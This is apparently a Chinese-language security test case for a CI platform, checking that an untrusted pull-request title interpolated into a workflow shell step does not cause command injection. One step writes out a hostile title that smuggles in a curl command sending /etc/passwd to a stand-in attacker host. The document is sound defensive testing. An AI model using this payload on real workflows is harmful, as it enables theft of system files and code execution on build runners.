用例 ID:   SEC-INJECT-03-001
维度标签:   [security]
维度:      安全性
优先级:    P0
溯源意图:  INTENT-SEC-009
母意图:    —
标题:      PR 标题中的不可信输入不应通过 ${{ }} 直接插入 run 导致命令注入

前置条件:
  - 主仓库有 pull_request 触发的 workflow，其中 run 块直接将 `${{ atomgit.event.pull_request.title }}` 插入 shell 命令
  - fork 贡献者可控制 PR 标题内容

操作步骤:
  1. fork 侧创建 PR，标题设为 `hello"; curl -s http://evil.example.com/exfil?data=$(cat /etc/passwd); echo "done`
  2. 触发 pull_request workflow
  3. 观察 job 日志中是否出现外发 HTTP 请求或注入命令的执行痕迹

预期结果:
  - PR 标题中的 shell 元字符（分号、引号、反引号、$()）不应被解释执行
  - 不应有指向外部服务器的 HTTP 请求来自注入命令
  - 平台应在表达式求值阶段对危险字符做转义或报错

验证点:
  - [负向] job 日志中不出现注入命令的执行副作用（如 curl/wget 的输出、/etc/passwd 内容等）
  - [正向] workflow 正常完成（若平台报错或拦截了危险字符）
  - [负向] 不应能在 runner 上执行 PR 标题中嵌入的任意命令

清理:      fixture
